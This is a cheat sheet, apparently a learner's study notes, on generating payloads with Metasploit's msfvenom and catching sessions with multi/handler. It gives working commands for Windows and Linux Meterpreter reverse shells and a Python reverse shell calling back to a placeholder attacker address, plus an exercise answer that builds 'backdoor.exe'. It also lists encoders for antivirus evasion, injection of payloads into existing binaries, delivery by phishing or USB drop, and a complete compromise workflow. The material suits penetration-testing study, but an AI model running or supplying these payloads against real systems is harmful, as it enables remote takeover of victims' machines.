

# msfvenom
 - CLI tool that generates payloads in various formats for any platform
 - part of *metasploit framework* but runs independently

#### You can use msfvenom to:
 - generate standalone executables (*.exe*, *.elf*, *.apk*)

 - generate raw shellcode (*.c*, *.py*, *.rb*)

 - create webshells (*PHP*, *ASP*, *JSP*)

 - encode payloads or transform byte patterns

 - inject payloads into existing binaries

#### connection to msfconsole
 - generate payload with `msfvenom`

 - deliver payload (eg. upload to target, ssh transfer, phishing)

 - set up a handler (listener) in msfconsole using `exploit/multi/handler`

 - execute payload on target or wait for it to connect back

 - interact with the session in msfconsole (`sessions -i <ID>`)

___________________________________
### Basic syntax:  
`msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <output_file>`

generate a Windows Meterpreter reverse shell as an executable:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe`

list all payloads

`msfvenom -l payloads` 

you will want to filter them (eg. *linux meterpreter payloads*)

`msfvenom -l payloads | grep linux | grep meterpreter`

`msfvenom -l formats` = list all executable formats and transform formats  
`msfvenom -l encoders` = list all encoders (eg. to bypass antivirus)  
`msfvenom -l platforms` = platforms (*android, apple_ios, unix...*)  
`msfvenom -l archs` = architectures (*x86, x64, arm, mips, ...*)

`msfvenom -p <payload> --list-options` = show options for the payload

___________________________________
### stageless x staged

`stageless payloads`
 - packaged in a single file
 - separator in name: **underscore** (eg. *linux/x64/meterpreter_reverse_tcp*)

`staged payloads`
 - small initial payload is sent first, connects to your handler which sends the rest
 - separator in name: **slash** (eg. *linux/x64/meterpreter/reverse_tcp*)

#### When to use which?
 - `stageless`
    - manual delivery (*USB drop, file upload, SSH transfer*)
    - unreliable network connection (eg. unstable Wi-Fi)
    - simplicity
    - msfvenom generated standalone payloads (reliable + self-contained is priority)

 - `staged`
    - **default and preferred**
    - minimize initial payload size (eg. buffer overflow with limited space)
    - other size constraints (eg. SQL injection where payload is limited by size)
    - msfconsole generated payloads (automatically managed staging process)

`meterpreter_reverse_tcp` is **stageless** (reliable + self-contained)

`meterpreter/reverse_tcp` is **staged** (smaller initial payload)

___________________________________
### common payload recipes

Windows Reverse Shell (EXE)  
`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f exe -o shell.exe`

Linux Reverse Shell (ELF)  
`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=CONNECTION_IP LPORT=4444 -f elf -o shell.elf`

Python one-liner  
`msfvenom -p cmd/unix/reverse_python LHOST=CONNECTION_IP LPORT=4444 -f raw`

#### **\*\*\*Exercise: Write the full msfvenom command to generate a:**
```
- stageless Windows x64 Meterpreter reverse TCP payload
- as an executable file named backdoor.exe,
- connecting back to 10.10.10.10 on port 5555
```

answer:
<details>
  <summary>🔍 click to reveal answer</summary>

  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=5555 -f exe -o backdoor.exe

</details>


___________________________________
### encoding
```
bad character removal (eg. null bytes)

format compliance (eg. character set restrictions)
```

`-e <encoder>` = specify an encoder to use
`-i <iterations>` = number of times to encode the payload
`-b <badchars_in_hex>` = specify bad characters to avoid (eg. -b "\x00\x0a\x0d")

the harsh truth...
***Machine learning models trained on millions of samples can identify malicious patterns even in polymorphic code.***

even if you
 - somehow got through the check,  
 - bypassed sandboxing and heuristics + other antivirus tactics  

you would probably get **cooked** by `AMSI` or it's UNIX equivalent (run-time inspection of scripts)

`AMSI` = Antimalware Scan Interface, intercepts scripts and inspects them after decoding, but before execution

the most well-known Metasploit encoder is **x86/shikata_ga_nai**  
(running it with 10 iterations on a default payload would get **detected on 99% of systems**)

___________________________________
### payload injection

`-x <existing_file>` = inject payload into an existing binary  
`-k` = preserve original apps functionality (at least attempt to)

multi-platfrom payloads:  
`-f macho` = macOS executable (Mach-O)  
`-f war` = Java web application (WAR)  
**no flag** needed = Android payloads  

___________________________________
### handlers and stuff

**exploit/multi/handler** module is Metasploit's universal listener
 - works with any payload type in the framework
 - `use exploit/multi/handler`
 - `set PAYLOAD <payload_name>`
 - `set LHOST <your_ip>`
 - `set LPORT <your_port>`
 - `show options` (see if everything needed is set)
 - `run`

> !! the handler and payload must have matching config - LHOST,RHOST, etc. !!  

> !! don't mix staged and stageless: msfvenom staged payload -> multi/handler staged payload !!

___________________________________
### workflow
1) **generate payload** with msfvenom
2) **start the handler** in msfconsole (make sure payload matches handler config)
3) **deliver** payload
4) **execute** payload/wait for it to connect back
5) msfconsole hopefully caught the session